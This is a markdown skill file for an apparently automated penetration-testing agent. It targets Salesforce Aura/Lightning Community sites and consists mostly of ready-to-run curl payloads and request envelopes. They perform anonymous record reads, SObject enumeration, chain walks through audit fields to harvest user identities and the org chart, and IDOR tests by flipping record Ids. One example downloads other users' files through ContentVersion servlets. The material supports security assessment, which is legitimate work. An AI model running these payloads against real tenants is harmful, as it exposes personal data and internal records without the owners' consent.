---
description: "Salesforce Aura / Lightning Communities deep-enum: POST envelope shape, SObject namespace probe list, tenant-singleton Id prefixes, chain-walk reference fields, IDOR boundedness test"
skill: vendor-platform-enum
source: Custom — compiled from the Aura framework, Salesforce platform documentation, and Site Guest profile research.
---

# Salesforce Aura / Lightning Communities — Deep-Enum Payloads

> Source: Custom — compiled from the Aura framework, Salesforce platform documentation, and Site Guest profile research.

Use these payloads after `vendor-platform-enum/SKILL.md` triggers on a Salesforce Aura / Lightning fingerprint. The Aura endpoint accepts a single POST shape; the action set inside the envelope determines whether you are doing namespace enumeration, tenant-singleton reads, chain walks, or IDOR boundedness tests.

## Aura POST envelope

Every probe targets the same path (`/aura?aura.ApexAction.execute=1`, `/aura?other.aura.token=...`, or the `/sfsites/c/aura` variant) with the same body shape. The server is strict — one wrong field name and the response is a generic `aura:invalidSession` error that hides whether the SObject was readable.

```bash
vigil assess kali exec --technique INFO-DISCLOSURE \
  --intent "Salesforce Aura getRecordWithFields probe — tenant-singleton Organization read" \
  --probe-kind payload --phase recon --timeout 30 -- \
  curl -sS -X POST 'https://TARGET/s/sfsites/aura?other.aura.frameworkJsBootstrap.bootstrapJs=1' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'message={"actions":[{"id":"AURA-1","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecordWithFields","callingDescriptor":"UNKNOWN","params":{"recordId":"00D000000000000EAA","record":null,"inContextOfComponent":"","fields":["Id","Name"],"layoutType":"FULL","mode":"VIEW"}}]}' \
    --data-urlencode 'aura.context={"mode":"PROD","fwuid":"FWUID_PLACEHOLDER","app":"siteforce:communityApp","loaded":{"APPLICATION@markup://siteforce:communityApp":"APP_HASH_PLACEHOLDER"},"dn":[],"globals":{},"uad":false}' \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined'
```

The five fields on `aura.context` (`mode`, `fwuid`, `app`, `loaded`, `globals`) are mandatory. `fwuid` and the `loaded[...]` hash are tenant-specific — pull them from the `<script>` block on the site's landing page (`window.Aura.framework.fwuid` and the same `loaded` map are inlined into the page as part of the bootstrap).

## Standard SObject probe list (namespace enumeration)

Run `getObjectInfos` once per SObject. Anonymous-describable SObjects return a `defaultRecordTypeId`, `urls.sobject`, or non-empty `fields[]` array; non-describable SObjects return an `INVALID_TYPE` error.

```
Account, Contact, Lead, Opportunity, OpportunityLineItem, Pricebook2, PricebookEntry, Product2, Order, OrderItem,
User, UserRole, Profile, PermissionSet, PermissionSetAssignment, Group, GroupMember, Organization, Network, NetworkMember,
Case, CaseComment, CaseTeamMember, CaseHistory, Solution, FeedItem, FeedComment, EmailMessage, Task, Event,
Knowledge__kav, KnowledgeArticleVersion, Topic, TopicAssignment, FlowDefinition, FlowDefinitionView, ProcessDefinition, ProcessNode,
StaticResource, ContentVersion, ContentDocument, ContentDocumentLink, Attachment, Document, Folder, Note,
RecordType, BusinessHours, Holiday, Translation, CustomLabel, ApexClass, ApexTrigger, AuraDefinitionBundle,
LoginHistory, LoginGeo, AuthSession, IdpEventLog, AuditTrail
```

Custom SObjects appear with the `__c` suffix (`Quote__c`, `Project__c`); managed-package SObjects appear with the `<PKG>__<Object>__c` shape (`npe01__OppPayment__c`, `npsp__Allocation__c`, `FF__SalesInvoice__c`).

## Tenant-singleton Id prefixes

Each tenant has exactly one of these records. Anonymous Site Guest profiles sometimes read them even when adjacent records require authentication. Read each via `getRecordWithFields` with the matching prefix Id pattern:

| Prefix | SObject | Notes |
|---|---|---|
| `00D` | `Organization` | The tenant. Leak exposes org name, edition, default record types, fiscal year settings. |
| `00e` | `Profile` | The Site Guest profile is one of these. Reading it leaks the FLS / object permission set. |
| `0DB` | `Network` | One per Experience Cloud site. Exposes site name, default community settings. |
| `00G` | `Group` | Queues, public groups, role-based groups. |
| `00E` | `UserRole` | Role hierarchy. |
| `0Pc` | `BusinessHours` | Tenant business hours. |
| `01p` | `ApexClass` | Source code is not exposed, but namespace + last-modified-by are. |
| `005` | `User` | All user records share this prefix. The Site Guest user is one. |

The full Id list per tenant is enumerable: take any leaked record and walk its `LastModifiedById` / `CreatedById` to find adjacent users.

## Chain-walk reference fields

Every SObject row carries audit fields. Walk them in this order:

| Field | Points at | Rationale |
|---|---|---|
| `LastModifiedById`, `CreatedById` | `User` | Internal user identity (name, email, profile). |
| `OwnerId` | `User` or `Group` | Record-level owner. Group ownership leaks queue membership. |
| `ProfileId` | `Profile` | The owner's profile (FLS reveals what that user can do). |
| `UserRoleId` | `UserRole` | Role-hierarchy position (manager chain). |
| `ManagerId` | `User` | Direct chain into the org chart. |
| `RecordTypeId` | `RecordType` | Record type metadata (which page layout, which picklist values). |
| `<lookup>__c` | adjacent custom SObject | Custom relationships expose the data model. |

A typical chain walk runs 3-5 hops before terminating on a 401/403 or looping to an Id already enumerated.

## Bounded-vs-systemic IDOR test

Take one leaked `recordId` (e.g., the `User` Id from a `LastModifiedById` walk). Flip the last character and re-issue `getRecordWithFields`. Two outcomes:

- **Bounded** — adjacent Id returns `INSUFFICIENT_ACCESS_OR_READONLY` or `NOT_FOUND`. The leak surface is the singleton + chain-walk graph.
- **Systemic** — adjacent Id returns 200 with a different record. Severity escalates to tenant-wide enumeration.

Record the boundedness verdict in the finding's `details.bounded_or_systemic` field — the verifier and report-writer cannot reconstruct it later.

## File / blob download servlets (ContentVersion IDOR)

A write that returns a `068...` `ContentVersion` id should be followed by a *download* attempt — ownership is frequently unchecked on the download route even when the Aura/REST surface exposes no read. Probe these blob-download endpoints (ties to the object-store IDOR tactic in `agent/references/access-control/idor-modern-architectures.md`):

- `/sfc/servlet.shepherd/version/download/<ContentVersionId>` — download a `ContentVersion` (`068...`) directly.
- `/servlet/servlet.FileDownload?file=<id>` — legacy `Attachment`/`Document` download by id.
- `/sfc/servlet.shepherd/document/download/<id>` — download a `ContentDocument` (`069...`).

```bash
vigil assess kali exec --technique IDOR \
  --intent "Salesforce ContentVersion blob-download IDOR — read foreign uploaded document" \
  --probe-kind exploit --phase exploit --timeout 30 -- \
  curl -sS 'https://TARGET/sfc/servlet.shepherd/version/download/068XXXXXXXXXXXXXXX'
```

Flip the trailing characters of an observed `068...`/`069...` id to test for systemic enumeration; a 200 with foreign document bytes = cross-user PII read.

## `executeAction` (worker action) probe

Beyond `getRecordWithFields` and `getObjectInfos`, Aura also exposes server-side controllers via `aura://...Controller/ACTION$<methodName>`. Anonymous-callable controller methods sometimes ship with managed packages or custom code — probe these names against any controller name leaked in the page bootstrap or source maps:

```json
{
  "actions": [{
    "id": "AURA-2",
    "descriptor": "aura://<NamespacedController>/ACTION$<methodName>",
    "callingDescriptor": "UNKNOWN",
    "params": {}
  }]
}
```

A 200 response with `state: "SUCCESS"` and a non-empty `returnValue` indicates an anonymous-callable worker action — record as a separate finding because the impact depends on what the method does (often a privileged read or write).

## Rate-limit discipline

The Aura playbook sends 30+ POST requests per dispatch (namespace enumeration + singleton reads + chain walks). Default to 1 request / 250ms (4 RPS); drop to 1 request / 1000ms on the first 429 or `Retry-After`. Batch namespace enumeration into a single POST with multiple `actions[]` entries when feasible — the envelope supports it and one batched request is one audit row instead of thirty.
